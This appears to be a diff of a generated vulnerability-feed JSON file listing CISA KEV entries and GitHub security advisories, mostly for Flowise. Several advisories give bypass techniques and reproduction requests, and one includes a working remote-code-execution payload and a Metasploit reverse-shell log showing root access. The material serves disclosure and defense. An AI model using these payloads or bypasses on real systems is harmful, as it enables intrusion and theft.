@@ -1,10 +1,67 @@
 {
-  "generated": "2026-08-04T13:41:18.310781+00:00",
-  "total": 24,
-  "kev": 0,
-  "zero_day": 12,
+  "generated": "2026-08-04T19:16:30.287410+00:00",
+  "total": 36,
+  "kev": 3,
+  "zero_day": 13,
   "enriched": 0,
   "findings": [
+    {
+      "id": "CVE-2026-9198",
+      "title": "CVE-2026-9198 \u2014 IBM Langflow Code Injection Vulnerability",
+      "summary": "Vendor: IBM | Product: Langflow. Langflow contains a code injection vulnerability that allows unauthenticated attackers to achieve full remote code execution on default Langflow deployments. Required action: Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines. (due 2026-08-07)",
+      "link": "https://nvd.nist.gov/vuln/detail/CVE-2026-9198",
+      "published": "2026-08-04",
+      "source": "CISA KEV",
+      "tags": [
+        "cisa",
+        "kev",
+        "actively-exploited"
+      ],
+      "cve_ids": [
+        "CVE-2026-9198"
+      ],
+      "is_kev": true,
+      "is_zero_day": true,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-18556",
+      "title": "CVE-2026-18556 \u2014 N-able N-central Authentication Bypass Using an Alternate Path or Channel Vulnerability",
+      "summary": "Vendor: N-able | Product: N-central. N-able N-central contains an authentication bypass using an alternate path or channel that allows for authentication bypass. Required action: Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines. (due 2026-08-07)",
+      "link": "https://nvd.nist.gov/vuln/detail/CVE-2026-18556",
+      "published": "2026-08-04",
+      "source": "CISA KEV",
+      "tags": [
+        "cisa",
+        "kev",
+        "actively-exploited"
+      ],
+      "cve_ids": [
+        "CVE-2026-18556"
+      ],
+      "is_kev": true,
+      "is_zero_day": true,
+      "is_high_severity": false
+    },
+    {
+      "id": "CVE-2026-34486",
+      "title": "CVE-2026-34486 \u2014 Apache Tomcat Missing Encryption of Sensitive Data Vulnerability",
+      "summary": "Vendor: Apache | Product: Tomcat. Apache Tomcat contains a missing encryption of sensitive data vulnerability that allows the bypass of the EncryptInterceptor. Required action: Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines. (due 2026-08-07)",
+      "link": "https://nvd.nist.gov/vuln/detail/CVE-2026-34486",
+      "published": "2026-08-04",
+      "source": "CISA KEV",
+      "tags": [
+        "cisa",
+        "kev",
+        "actively-exploited"
+      ],
+      "cve_ids": [
+        "CVE-2026-34486"
+      ],
+      "is_kev": true,
+      "is_zero_day": true,
+      "is_high_severity": false
+    },
     {
       "id": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa26-194a",
       "title": "Improve Router Hygiene to Protect Against Russian State-Sponsored Targeting",
@@ -23,7 +80,7 @@
     {
       "id": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-163a",
       "title": "Ransomware Actors Exploit Unpatched SimpleHelp Remote Monitoring and Management to Compromise Utility Billing Software Provider",
-      "summary": "Summary The Cybersecurity and Infrastructure Security Agency (CISA) is releasing this advisory in response to ransomware actors leveraging unpatched instances of a vulnerability in SimpleHelp Remote Monitoring and Management (RMM) to compromise customers of a utility billing software provider. This incident reflects a broader pattern of ransomware actors targeting organizations through unpatched versions of SimpleHelp RMM since January 2025. SimpleHelp versions 5.5.7 and earlier contain several vulnerabilities, including CVE-2024-57727 \u2014a path traversal vulnerability. 1 Ransomware actors likely leveraged CVE-2024-57727 to access downstream customers\u2019 unpatched SimpleHelp RMM for disruption of services in double extortion compromises. 1 CISA added CVE-2024-57727 to its Known Exploited Vulnerabilities (KEV) Catalog on Feb. 13, 2025. CISA urges software vendors, downstream customers, and end users to immediately implement the Mitigations listed in this advisory based on confirmed compromise or risk of compromise. Download the PDF version of this report: AA25-163A Ransomware Actors Exploit Unpatched SimpleHelp Remote Monitoring and Management to Compromise Utility Billing Software Provider (PDF, 420.49 KB ) Mitigations CISA recommends organizations implement the mitigations below to respond to emerging ransomware activity exploiting SimpleHelp software. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA\u2019s CPGs webpage for more information on the CPGs, including additional recommended baseline protections. These mitigations apply to all critical infrastructure ",
+      "summary": "Summary The Cybersecurity and Infrastructure Security Agency (CISA) is releasing this advisory in response to ransomware actors leveraging unpatched instances of a vulnerability in SimpleHelp Remote Monitoring and Management (RMM) to compromise customers of a utility billing software provider. This incident reflects a broader pattern of ransomware actors targeting organizations through unpatched versions of SimpleHelp RMM since January 2025. SimpleHelp versions 5.5.7 and earlier contain several vulnerabilities, including CVE-2024-57727 \u2014a path traversal vulnerability. 1 Ransomware actors likely leveraged CVE-2024-57727 to access downstream customers\u2019 unpatched SimpleHelp RMM for disruption of services in double extortion compromises. 1 CISA added CVE-2024-57727 to its Known Exploited Vulnerabilities (KEV) Catalog on Feb. 13, 2025. CISA urges software vendors, downstream customers, and end users to immediately implement the Mitigations listed in this advisory based on confirmed compromise or risk of compromise. Download the PDF version of this report: AA25-163A Ransomware Actors Exploit Unpatched SimpleHelp Remote Monitoring and Management to Compromise Utility Billing Software Provider (PDF, 381.95 KB ) Mitigations CISA recommends organizations implement the mitigations below to respond to emerging ransomware activity exploiting SimpleHelp software. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA\u2019s CPGs webpage for more information on the CPGs, including additional recommended baseline protections. These mitigations apply to all critical infrastructure ",
       "link": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-163a",
       "published": "Thu, 12 Jun 2025 10:29:54 EDT",
       "source": "CISA US-CERT Alerts",
@@ -33,6 +90,24 @@
       ],
       "cve_ids": [
         "CVE-2024-57727"
+      ],
+      "is_zero_day": true,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-69263",
+      "title": "Flowise: CVE-2025-8943 Patch Bypass: npm_config_yes bypasses MCP environment variable blocklist (Unauthenticated RCE)",
+      "summary": "## Summary\n\nThe mitigation shipped for CVE-2025-8943 blocks the `-y` and `--yes` flags on `npx` to stop auto-installation of arbitrary packages. That flag filter works. The environment-variable check in the same patch denies only four variable names by exact string match, and `npm` reads its configuration directly from `npm_config_*` environment variables. Setting `npm_config_yes=true` reproduces the `--yes` behaviour the flag filter is meant to prevent, so `npx` auto-installs and executes the named package. The mitigation is fully bypassed.\n\nThis works with the MCP security check enabled (`CUSTOM_MCP_SECURITY_CHECK=true`). On a default Flowise deployment, which ships with no authentication, the result is unauthenticated remote code execution.\n\n## Root cause\n\nThe patch treats this as a flag-filtering problem, but the behaviour gated by `--yes` is also reachable through `npm`'s environment-based configuration. The same is true for the other permitted interpreters, `node` and `python3`. A denylist of variable names cannot enumerate every environment variable that alters execution, so the control is incomplete by construction. The fix is to allowlist (or strip) the environment before it reaches the child process, not to extend the denylist.\n\n## Affected version\n\nFlowise 3.1.1, current as of 2026-03-29.\n\n## Details\n\nValidation happens in `packages/components/nodes/tools/MCP/core.ts`. Two functions run in sequence before any MCP server launches: `validateCommandFlags` and `validateEnvironmentVariables`.\n\n`validateCommandFlags` is thorough. It blocks `-y` and `--yes` along with a comprehensive set of dangerous flags across `npx`, `node`, `python`, `python3`, and `docker`. That part of the patch is sound.\n\nThe gap is in `validateEnvironmentVariables`:\n\n```typescript\nexport const validateEnvironmentVariables = (env: Record<string, any>): void => {\n    const dangerousEnvVars = ['PATH', 'LD_LIBRARY_PATH', 'DYLD_LIBRARY_PATH', 'NODE_OPTIONS']\n    for (const [key, value] of Obj",
+      "link": "https://github.com/advisories/GHSA-xc48-889x-5qmw",
+      "published": "2026-08-04T17:09:48Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-69263"
       ],
       "is_zero_day": true,
       "is_high_severity": true
@@ -199,6 +274,204 @@
       "is_high_severity": false
     },
     {
+      "id": "CVE-2026-70473",
+      "title": "Flowise: Information Disclosure in GET /api/v1/upsert-history returns the entire server-wide upsert history",
+      "summary": "### Summary\nThe **GET `/api/v1/upsert-history`** endpoint returns the **entire server-wide upsert history** (response size **>100MB**) instead of being scoped to the requesting user/tenant/workspace. The response includes **sensitive configuration data** (e.g., Vector Store settings such as **Qdrant Server URL** and **collection name**), resulting in a **High severity information disclosure** that may enable further targeted attacks.\n\n### Details\n- **Affected endpoint:** `GET /api/v1/upsert-history`\n- **Observed behavior:** The API returns **global upsert history for the whole server**, indicating missing/insufficient:\n  - Authorization checks (RBAC/user-based access control)\n  - Data scoping (workspace/project/tenant isolation)\n  - Pagination/limits (excessive data exposure and very large responses)\n- **Sensitive data exposure:** The returned history contains integration parameters and infrastructure details. Example excerpt from the response:\n  ```json\n  {\n    \"label\": \"Qdrant\",\n    \"name\": \"qdrant\",\n    \"category\": \"Vector Stores\",\n    \"id\": \"qdrant_0\",\n    \"paramValues\": [\n      {\n        \"label\": \"Qdrant Server URL\",\n        \"name\": \"qdrantServerUrl\",\n        \"type\": \"string\",\n        \"value\": \"https://7f60f255-f7fd-4a1c-a734-fbcf904f9f85.europe-west3-0.gcp.cloud.qdrant.io\"\n      },\n      {\n        \"label\": \"Qdrant Collection Name\",\n        \"name\": \"qdrantCollection\",\n        \"type\": \"string\",\n        \"value\": \"fair-herring-azure\"\n      },\n      {\n        \"label\": \"Vector Dimension\",\n        \"name\": \"qdrantVectorDimension\",\n        \"type\": \"number\",\n        \"value\": 1536\n      },\n      {\n        \"label\": \"Content Key\",\n        \"name\": \"contentPayloadKey\",\n        \"type\": \"string\",\n        \"value\": \"content\"\n      },\n      {\n        \"label\": \"Metadata Key\",\n        \"name\": \"metadataPayloadKey\",\n        \"type\": \"string\",\n        \"value\": \"metadata\"\n      },\n      {\n        \"label\": \"Similarity\",\n        \"name\": \"qdrantSimilarity\",\n        \"type\": \"options\",\n     ",
+      "link": "https://github.com/advisories/GHSA-fr6g-7cq8-fg82",
+      "published": "2026-08-04T17:57:27Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-70473"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-70472",
+      "title": "Flowise: Cross-workspace credential IDOR in openai-assistants-vector-store",
+      "summary": "# Summary \n\nThese endpoints accept a client-controlled `credential` parameter. The server loads credentials by `id` and uses them directly, without checking whether that credential belongs to the caller\u2019s workspace. If an attacker knows another workspace\u2019s `credentialId`, they can use that workspace\u2019s OpenAI key.\n\n# Details\n\nRoute permissions (`assistants:*`) only check feature access. They do not check credential ownership. The controller passes `req.query.credential` straight to the service. The service does `findOneBy({ id: credentialId })`, decrypts the credential, and calls OpenAI APIs. There is no `workspaceId` check in this flow, so this is an IDOR.\n\n# Impact \n\n\n- Cross-workspace unauthorized use of stored OpenAI keys.\n- Unauthorized read/modify/delete of victim vector stores and files.\n- Direct billing impact on victim OpenAI account.\n- Multi-tenant boundary violation with practical exploitability.\n\n# Reproduction steps  \n\n1. Set up two workspaces: A (attacker) and B (victim), each with an OpenAI credential.  \n2. Log in as a user in workspace A (with assistants-related permissions).  \n3. Call `/api/v1/openai-assistants-vector-store` and set `credential` to B\u2019s credential ID.  \n4. Example: `GET /api/v1/openai-assistants-vector-store?credential=<B_credentialId>`.  \n5. If responses/actions are executed using B\u2019s credential context, the issue is confirmed.",
+      "link": "https://github.com/advisories/GHSA-chm3-vqcf-52rx",
+      "published": "2026-08-04T17:51:48Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-70472"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-70471",
+      "title": "Flowise: RBAC Bypass Leading to Unauthorized Workspace Variables Disclosure",
+      "summary": "## Finding \u2014 Unauthorized Workspace Variables disclosure via $vars injection (bypasses variables:view)\n\n  ### What\u2019s wrong (code locations)\n\n  - Variables for the active workspace are fetched without checking \u201cvariables:view\u201d at this call site: flowise-src/\n    packages/components/src/utils.ts:932\n  - Runtime variables are resolved from server environment variables: flowise-src/packages/components/src/utils.ts:976\n  - $vars is always injected into the code execution sandbox: flowise-src/packages/components/src/utils.ts:1782\n  - The official Variables API is permission-protected (contrast): flowise-src/packages/server/src/routes/variables/\n    index.ts:11\n\n  ### Why it is a privilege boundary bypass\n\n  A user/API key might be denied variables:view (and the /api/v1/variables route enforces it), but they can still:\n\n  - call /api/v1/node-custom-function (Finding 1)\n  - and have $vars pre-populated with all variables for the workspace, including runtime values from process.env\n\n  ### What data is exposed\n\n  Inside the custom JS context, $vars contains a flat map of:\n\n  - Variable.name -> Variable.value for static variables, and\n  - Variable.name -> process.env[Variable.name] for runtime variables (type === 'runtime')\n\n  This can expose secrets such as database passwords, JWT secrets, SMTP passwords, cloud keys, etc., depending on what\n  the workspace Variables are configured to map.\n\n  ### Recommended fix (minimum)\n\n  - Do not inject $vars unless the caller is authorized:\n      - enforce variables:view before injecting $vars, or\n      - inject only an explicit allowlist of variables needed for the function\n  - Consider disabling or heavily restricting type=runtime variables in self-hosted environments (or restrict which env\n    keys may be mapped).",
+      "link": "https://github.com/advisories/GHSA-8r8h-6vcc-xhrv",
+      "published": "2026-08-04T17:43:36Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-70471"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-70470",
+      "title": "Flowise: Pyodide validator Unicode homoglyph bypass leads to RCE",
+      "summary": "### Summary\nThe validatePythonCodeForDataFrame blacklist in packages/components/src/pythonCodeValidator.ts can be bypassed with Unicode homoglyph identifiers, allowing arbitrary Python execution inside Pyodide and full OS command execution on the Flowise host via Pyodide's js module interop. This reopens the RCE paths patched as GHSA-3hjv-c53m-58jj (CSV Agent) and GHSA-v38x-c887-992f (Airtable Agent).\n\n### Details\npackages/components/src/pythonCodeValidator.ts gates every call to pyodide.runPythonAsync in packages/components/nodes/agents/CSVAgent/CSVAgent.ts (lines 147, 198) and packages/components/nodes/agents/AirtableAgent/AirtableAgent.ts (line 186). The gate is a regex blacklist:\n\n```ts\n{ pattern: /\\bimport\\b/g, ... },\n{ pattern: /\\b__class__\\b/g, ... },\n{ pattern: /\\b__subclasses__\\s*\\(/g, ... },\n{ pattern: /\\b__builtins__\\b/g, ... },\n{ pattern: /\\b__mro__\\b/g, ... },\n// ... about 30 similar rules\n```\n\nTwo design flaws combine into a bypass:\n\n1. JavaScript regex `\\b` is ASCII-only. Word boundaries are computed against the ASCII word class `[A-Za-z0-9_]`. A Unicode letter such as U+1D41A (mathematical bold small a) is treated as a non-word character, so `\\b__class__\\b` never matches `__cl\ud835\udc1ass__`.\n2. Python 3 (PEP 3131) NFKC-normalizes every identifier at parse time. `__cl\ud835\udc1ass__`, `__subcl\ud835\udc1asses__`, `__b\ud835\udc1ase__`, `__b\ud835\udc2eiltins__`, and similar homoglyph forms are all parsed as their ASCII equivalents.\n\nAttribute access `obj.__cl\ud835\udc1ass__` is normalized because attribute names are identifiers. Dict string keys such as `bi['__import__']` are not normalized, but they are free text and can be assembled with `chr()` to avoid literal matches on patterns like `\\bimport\\b` or `\\b__import__\\s*\\(/`.\n\nFrom inside Pyodide, `__builtins__['__import__']('js')` yields the JS host bridge. In the Node.js host that runs Flowise, that bridge exposes `process.mainModule.require('child_process').execSync`, which runs native commands on the host with the privileges of the Flowise process.\n\nAffecte",
+      "link": "https://github.com/advisories/GHSA-52fh-8v99-63c2",
+      "published": "2026-08-04T17:31:09Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-70470"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-69262",
+      "title": "Flowise: `DELETE /api/v1/chatflows/:id` does not validate resource type, allowing `agentflows:delete` and `chatflows:delete` to delete each other\u2019s flow type",
+      "summary": "# summary:\nIn Flowise, `DELETE /api/v1/chatflows/:id` authorizes requests with `checkAnyPermission('chatflows:delete,agentflows:delete')`. Possession of either permission is sufficient to reach the delete path. The delete logic does not validate the target resource `type`, allowing a caller with only `agentflows:delete` to delete a `CHATFLOW`, and a caller with only `chatflows:delete` to delete an `AGENTFLOW`.\n\n# details:\nThe delete route accepts either `chatflows:delete` or `agentflows:delete`. The subsequent logic only resolves the target record by `id` and `workspaceId`, then deletes by `id` without checking whether the target resource type matches the granted permission domain.\n\nAs a result, there is no binding between permission scope and flow type:\n\n- `agentflows:delete` can be used to delete `CHATFLOW`\n- `chatflows:delete` can be used to delete `AGENTFLOW`\n\nThis breaks the intended RBAC separation between Chatflows and Agentflows.\n\n# impact:\nUsers authorized to manage only one flow type can delete the other flow type within the same workspace, resulting in unauthorized deletion and configuration loss.\n\n# reproduction steps:\n\n1. Log in as a user who can create API keys.\n2. Create a normal `CHATFLOW` and record its `id`.\n3. Create an API key with only `agentflows:delete`.\n4. Use that API key to send:\n\n```bash\ncurl -i -X DELETE \\\n  -H 'Authorization: Bearer <agentflows_delete_only_key>' \\\n  http://localhost:8080/api/v1/chatflows/<chatflow_id>\n```\n\n5. Observe a `200 OK` response, for example:\n\n```json\n{\"raw\":[],\"affected\":1}\n```\n\n6. Read the same `id` again and observe `404 Not Found`.",
+      "link": "https://github.com/advisories/GHSA-p5w8-m249-4r4v",
+      "published": "2026-08-04T16:50:32Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-69262"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-69257",
+      "title": "Flowise: SSRF Protection Bypass via IPv4-Mapped IPv6 Addresses",
+      "summary": "## Summary\n\nFlowise's HTTP security module (`httpSecurity.ts`) fails to normalize IPv4-mapped IPv6 addresses (e.g., `::ffff:127.0.0.1`, `::ffff:169.254.169.254`) before checking them against the deny list. Due to an `ipaddr.js` kind mismatch (`ipv6` vs `ipv4`), all IPv4 CIDR deny rules are silently skipped for IPv4-mapped IPv6 addresses. An attacker who controls DNS resolution for a hostname can set a AAAA record to `::ffff:<target_ipv4>`, completely bypassing all SSRF protections and accessing internal services, cloud metadata endpoints, and localhost.\n\n## CWE\n\n- **CWE-918**: Server-Side Request Forgery (SSRF)\n- **CWE-1389**: Incorrect Parsing of Numbers with Different Radices (IPv4-mapped IPv6 not normalized to IPv4 before deny list check)\n\n## Affected Versions\n\n- All versions up to and including **v3.1.1** (latest main branch as of 2026-04-03)\n- This includes versions where CVE-2026-31829 was supposedly patched (v3.0.13+)\n\n## Details\n\n### Root Cause\n\nThe `isDeniedIP()` function in `packages/components/src/httpSecurity.ts` checks IP addresses against a deny list using `ipaddr.js`. The critical flaw is in the `kind()` comparison:\n\n```typescript\n// httpSecurity.ts - isDeniedIP()\nexport function isDeniedIP(ip: string, denyList: string[]): void {\n    const parsedIp = ipaddr.parse(ip);\n    for (const entry of denyList) {\n        if (entry.includes('/')) {\n            try {\n                const [range, _] = entry.split('/')\n                const parsedRange = ipaddr.parse(range)\n                // \u26a0\ufe0f BUG: IPv4-mapped IPv6 has kind='ipv6', IPv4 CIDR has kind='ipv4'\n                // This condition is FALSE for ::ffff:x.x.x.x vs any IPv4 CIDR entry\n                if (parsedIp.kind() === parsedRange.kind()) {  // <-- BYPASS HERE\n                    if (parsedIp.match(ipaddr.parseCIDR(entry))) {\n                        throw new Error('Access to this host is denied by policy.')\n                    }\n                }\n            } catch (error) {\n                throw ne",
+      "link": "https://github.com/advisories/GHSA-c6xh-wv4j-ppv5",
+      "published": "2026-08-04T15:51:58Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-69257"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-69256",
+      "title": "Flowise: Remote Code Execution Vulnerability in CSVAgent",
+      "summary": "### Summary\n\nThe CSVAgent node was observed to allow users to write Python code which gets executed via `pyodide`. The original intent was to allow users to utilise the `pandas` library for CSV processing. Although there is a denylist that checks for dangerous Python constructs from being passed in, `pandas` has a `read_pickle()` [function](https://pandas.pydata.org/docs/reference/api/pandas.read_pickle.html) that deserialises a pickled payload and this can be leveraged to achieve code execution.\n\n### Details\n\nThe affected file is the `CSVAgent` node, found in: `flowise-components/nodes/agents/CSVAgent/CSVAgent.ts`.\n\n```js\ntry {\n    const code = `import pandas as pd\nimport base64\nfrom io import StringIO\nimport json\n\nbase64_string = \"${base64String}\"\n\ndecoded_data = base64.b64decode(base64_string)\n\ncsv_data = StringIO(decoded_data.decode('utf-8'))\n\ndf = pd.${customReadCSVFunc} <1>\nmy_dict = df.dtypes.astype(str).to_dict()\nprint(my_dict)\njson.dumps(my_dict)`\n    dataframeColDict = await pyodide.runPythonAsync(code)\n} catch (error) {\n    throw new Error(error)\n}\n```\n\nAt <1>, the `customReadCSVFunc` is supplied by the user. This input goes through input validation that denies dangerous Python constructs from being passed in:\n\n```py\nconst FORBIDDEN_PATTERNS: Array<{ pattern: RegExp; reason: string }> = [\n    // Imports (the executor pre-imports pandas and numpy; LLM code must not add any imports)\n    { pattern: /\\bfrom\\s+\\S+\\s+import\\b/g, reason: 'import statement (from...import)' },\n    { pattern: /\\bimport\\b/g, reason: 'import statement (all imports forbidden; pandas and numpy are pre-imported by the executor)' },\n    // Dangerous builtins\n    { pattern: /\\beval\\s*\\(/g, reason: 'eval()' },\n    { pattern: /\\bexec\\s*\\(/g, reason: 'exec()' },\n    { pattern: /\\bcompile\\s*\\(/g, reason: 'compile()' },\n    { pattern: /\\b__import__\\s*\\(/g, reason: '__import__()' },\n    { pattern: /\\bopen\\s*\\(/g, reason: 'open()' },\n    { pattern: /\\bbreakpoint\\s*\\(/g, reason: 'breakpoint()' },",
+      "link": "https://github.com/advisories/GHSA-x6vm-w76m-8j7g",
+      "published": "2026-08-04T15:46:20Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-69256"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-69255",
+      "title": "Flowise: CSV Agent Remote Code Execution via Pyodide Code Injection \u2014 Root Shell Verified",
+      "summary": "## UPDATE 2026-05-20: Full RCE as root VERIFIED\n\n**This is not theoretical \u2014 a Meterpreter reverse shell session as root has been established on Flowise 3.1.2.**\n\n### Verified Exploit Chain\n\n1. Python code injection via `base64_string = \"${base64String}\"` (CSVAgent.ts line 161)\n2. Pyodide `js` bridge provides access to the host Node.js process\n3. `process.mainModule.constructor._load('child_process')` loads child_process (bypasses ESM require restriction)\n4. `.execSync('CMD')` executes arbitrary OS commands as **root** (PID 1 in container)\n\n### Working RCE Payload\n\n```\n\";import js;e=js.globalThis.eval;e(\"process.mainModule.constructor._load('child_process').execSync('id')\");#\n```\n\n**Constraint:** No commas allowed in payload \u2014 `csvFile.split(',')` splits on all commas.\n\n### Metasploit Session Proof\n\n```\nmsf > use exploit/multi/http/flowise_csv_agent_rce\nmsf > set PAYLOAD cmd/linux/http/x64/meterpreter/reverse_tcp\nmsf > exploit\n\n[+] Authentication successful\n[+] Created chatflow: b6716feb-63c8-4fd2-993f-cd43788704b4\n[*] Sending stage (3090404 bytes) to 172.17.0.2\n[*] Meterpreter session 1 opened (172.17.0.1:4444 -> 172.17.0.2:41422)\n\nmeterpreter > getuid\nServer username: root\n\nmeterpreter > sysinfo\nComputer     : cbce3fb352b7\nOS           : Linux 6.8.0-111-generic\nArchitecture : x64\nMeterpreter  : x64/linux\n\nmeterpreter > shell\n# id\nuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)\n\n# uname -a\nLinux cbce3fb352b7 6.8.0-111-generic x86_64 Linux\n```\n\n### Additional Verified Impact\n\n**Credential Theft:**\n```\nFLOWISE_PASSWORD=admin123\nDATABASE_PATH=/root/.flowise\nAPIKEY_PATH=...\n```\n\n**Arbitrary File Read** via `process.binding('fs').readFileUtf8('/etc/hostname')` \u2192 `cbce3fb352b7`\n\n**Server DoS** \u2014 certain native binding calls (spawn_sync) crash the Node.js process entirely.\n\n### CVSS v3.1: 9.9 CRITICAL\n\n`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`\n\n---\n\n## Original Report (below)\n\n## Vulnerable Code\n\n**File:** `packages/components/nodes/agents/CSVAgent/CSVAg",
+      "link": "https://github.com/advisories/GHSA-vmv7-4m6c-3cg5",
+      "published": "2026-08-04T15:40:28Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-69255"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-69253",
+      "title": "Flowise Sandbox Escape to RCE",
+      "summary": "=============================================================================\n                                                            Security Advisory\n                                                                       elttam\n\nTopic:          Flowise JavaScript Sandbox Escape\n\nModule:         FlowiseAI/Flowise, FlowiseAI/nodevm\nDisclosed:      11-Apr-2026\nCredits:        Luke Jahnke and Alex Brown\nAffects:        `FlowiseAI/Flowise 3.1.1`, `FlowiseAI/nodevm  3.9.25`\n\n# I.   Background\n\nFlowise AI is an open-source, low-code platform for building AI applications\u2014such as chatbots, workflows, and autonomous agents\u2014through an intuitive drag-and-drop interface, minimising the need for extensive coding.\n\nThe platform also enables execution of custom JavaScript within a sandboxed environment via the Custom Function Agent Flow node or Custom Tool. By default, this sandbox is powered by `patriksimek/vm2`, a fork of the `patriksimek/vm2` package.\n\n# II.  Problem Description\n\n**NOTE**: This vulnerability still impacts commit `dddfb3c90eec900d747790a439bd362a764039cd` (the latest commit on the main branch at the time of writing). The original report was incorrectly closed, due to a misunderstanding that the report was about the use of an outdated and vulnerable version of the `patriksimek/vm2` sandbox. The sandbox escape that this report documents is an issue with Flowise, and patching the `vm2` sandbox would not resolve it.\n\nThe `patriksimek/vm2` sandbox executes JavaScript within the same Node.js process, which introduces significant security limitations and makes safely isolating untrusted code inherently difficult. Due to these concerns, the maintainers had deprecated the project and previously issued the following warning:\n\n*https://github.com/n8n-io/vm2*\n> The library contains critical security issues and should not be used in production. Maintenance has been discontinued. Consider migrating to `isolated-vm`.\n\nTo demonstrate the risks associated with the use of th",
+      "link": "https://github.com/advisories/GHSA-wg86-r78f-74mp",
+      "published": "2026-08-04T15:13:33Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-69253"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-69252",
+      "title": "Flowise: Missing authorization on `/api/v1/files` allows low-privileged API keys to list and delete files across workspaces within the same organization",
+      "summary": "# summary:\nIn Flowise, the `/api/v1/files` route is protected only by the `feat:files` feature gate and does not enforce `checkPermission(...)` on either `GET` or `DELETE`. As a result, any authenticated API key within the organization, even one with unrelated permissions, can list and delete files belonging to other workspaces in the same organization.\n\n# details:\nThe `/files` route is mounted with `IdentityManager.checkFeatureByPlan('feat:files')` only and has no additional permission middleware. In the controller:\n\n- `getAllFiles` uses only `req.user.activeOrganizationId` and calls `getFilesListFromStorage(activeOrganizationId)`, which recursively lists files under the organization storage root\n- `deleteFile` reads `activeWorkspaceId`, but only uses it for storage quota bookkeeping; the actual deletion is performed using `activeOrganizationId + user-controlled path`\n\nAs a result, the API key\u2019s `permissions` and `activeWorkspaceId` are not used to restrict file access.  \nIn the local test environment,an API key bound to workspace `1592b32a-a11b-4996-80b6-e1c4c2969d88` with only `[\"tools:view\"]` was created, then successfully:\n\n- called `GET /api/v1/files` and received `200 OK`\n- listed a test file stored under a different workspace, `f92a9a4d-392e-4db2-af82-d14e1d553446`\n- called `DELETE /api/v1/files?path=f92a9a4d-392e-4db2-af82-d14e1d553446/poc-cross-workspace.txt` and received `200 OK`\n- confirmed the file was removed by re-querying the file list\n\n# impact:\nAny low-privileged API key holder within the same organization can list and delete files from other workspaces without any file-specific permission. This breaks workspace isolation inside the organization and can lead to unauthorized file access and destructive tampering.\n\n# 